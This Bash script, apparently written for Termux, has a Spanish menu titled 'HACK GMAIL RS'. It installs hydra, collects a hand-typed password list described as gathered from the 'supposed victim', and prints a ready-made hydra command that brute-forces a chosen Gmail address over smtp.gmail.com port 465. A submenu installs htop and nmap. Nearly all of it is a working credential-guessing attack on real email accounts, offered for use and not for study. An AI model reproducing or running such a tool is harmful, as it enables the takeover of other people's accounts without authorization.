#!/bin/bash

#Real Prueba Brute Force
echo
clear
function main_menu() {
    while :
    do     
echo -e "\e[1;32m======PASSWORD CRACKING======\e[0m"
echo
echo "    ─▄▀▀▀▄──────────────"
echo "    ─█───█──────────────"
echo "    ███████─────────▄▀▀▄"
echo "    ██───██░░█▀█▀▀▀▀█░░█"
echo "    ███▄███░░▀░▀░░░░░▀▀░"
echo
        echo " +--------------------------+"
        echo " |                          |"
        echo " |      HACK GMAIL RS       |"
        echo " |                          |"
        echo " +--------------------------+"
        echo
        echo -e "\e[1;36m REAL STRATEGY - DOMINANDO\e[0m"
echo
#LISTA DE OPCIONES
        echo -e "\e[1;33m[01]\e[1;32m Instalar hack gmail\e[0m"
echo
        echo -e "\e[1;33m[02]\e[1;32m Informacion de uso\e[0m"
echo
        echo -e "\e[1;33m[03]\e[1;32m Mas Herramientas\e[0m"
echo
        echo -e "\e[1;33m[04]\e[1;32m Creditos al creador\e[0m"
echo
        echo -e "\e[1;33m[05]\e[1;32m Crear lista de contraseñas\e[0m"
echo
        echo -e "\e[1;33m[06]\e[1;32m Ver lista de contraseñas\e[0m"
echo
       echo -e "\e[1;33m[07]\e[1;32m Ejecutar hack gmail\e[0m"
echo
       echo -e "\e[1;33m[08]\e[1;32m Salir del menu\e[0m"
echo
        read -p "Choice: " m_choice
        echo
# OPCIONES DEL MENU 
        case "$m_choice" in
            1) figlet Instalando
                 figlet Tools
                pkg install hydra
              echo -e "\e[1;32m===============================================\e[0m"
                figlet Hack Gmail
             echo -e "\e[1;32m================================================\e[0m"
             echo -e "\e[1;31m HERRAMIENTA INSTALADA\e[0m"
echo
             sleep 4
clear
                echo
                ;;
            2) figlet LEER TXT
                echo
sleep 2                
                 cat README.MD
sleep 7
                echo 
clear
                ;;
            3)  sub_menu
                ;;
            4)  figlet CREDITOS 
echo
                 echo -e "\e[1;32mCREATED BY: Real Strategy and Hydra\e[0m"
echo
                echo -e "\e[1;32mFACEBOOK MY: Real Hack RWAM\e[0m"
echo
                echo -e "\e[1;32mYOUTUBE MY: Real Hack RWAM\e[0m"
echo
                echo -e "\e[1;32mMENSAJE: Nunca dejes de aprender\e[0m"
                echo
sleep 4
clear
                ;;
            5)  echo -e "\e[1;32mCREANDO PASSLIST.TXT\e[0m"
echo
                  sleep 3
                  echo -e "\e[1;33mRECUERDE PARA SALIR DIJITE CTRL+ D\e[0m"
                  echo
                   echo -e "\e[1;36mESCRIBA LAS CONTRASEÑAS RECOPILADAS : \e[0m"
                  sleep 2
                  cat >passlist.txt
                ;;
            6)  figlet VER 
                  figlet PASS
sleep 3
echo
                 echo -e "\e[1;36mCONTRASEÑAS RECOPILADAS DE LA SUPUESTA VICTIMA:\e[0m"
                 cat passlist.txt
sleep 7
                 echo
                ;;
             7) echo
#Ejecutando los datos

echo -e "\e[1;33mESCRIBE TU CORREO: \e[0m"
read CORREO
echo
echo -e "\e[1;33mESCRIBE EL PASSLIST: \e[0m"
read PASSLIST
echo
echo
#Copy and Paste

echo -e "\e[1;36m              COPIA Y PEGA EL SIGUIENTE COMANDO\e[0m"
echo -e "\e[1;36m         PARA EJECUTAR LA BUSQUEDA DE LA CONTRASEÑA\e[0m"
echo
sleep 3
echo " #####################################"
echo " #          COMANDO HYDRA            #"
echo " #####################################"
echo
echo
sleep 1
echo -e "\e[1;32m hydra -l $CORREO -P $PASSLIST -s 465 -S -v -V -t 10 smtp.gmail.com smtp\e[0m"
echo 
echo
echo
exit 0
              ;;
             8) exit 0
# FINAL DEL MENU RS
             ;;
            *)  echo -e "\e[1;31mNo es una opcion valida\e[0m"
sleep 2
                echo
                ;;
        esac
    done
}

function sub_menu()
{
    while :
    do
        echo
        figlet SUPER 
        figlet TOOLS
        echo
        echo -e "\e[1;33m[01]\e[1;32m Instalar Htop\e[0m"
echo
        echo -e "\e[1;33m[02]\e[1;32m Instalar Nmap\e[0m"
echo
        echo -e "\e[1;33m[03]\e[1;32m Volver al menu anterior\e[0m"
echo
        read -p "Choice: " s_choice
        echo
#MENU DE HERRAMIENTAS
        case "$s_choice" in
            1)  figlet INSTALANDO
                figlet HTOP
sleep 2
                echo
                 pkg install htop
                echo "==============================================="
                figlet HTOP
             echo "================================================"
                 echo -e "\e[1;31mHERRAMIENTA INSTALADA\e[0m"
sleep 3
echo
clear
                ;;
            2)  figlet INSTALANDO
                 figlet NMAP
sleep 2
                echo
                pkg install nmap 
                echo "==============================================="
                figlet NMAP
             echo "================================================"
                 echo -e "\e[1;31mHERRAMIENTA INSTALADA\e[0m"
echo
clear
                ;;
            3)  main_menu
                ;;
            *)  echo -e "\e[1;31mNo es una opcion valida\e[0m"
sleep 2
                echo
                ;;
        esac
    done
}

main_menu

exit 0
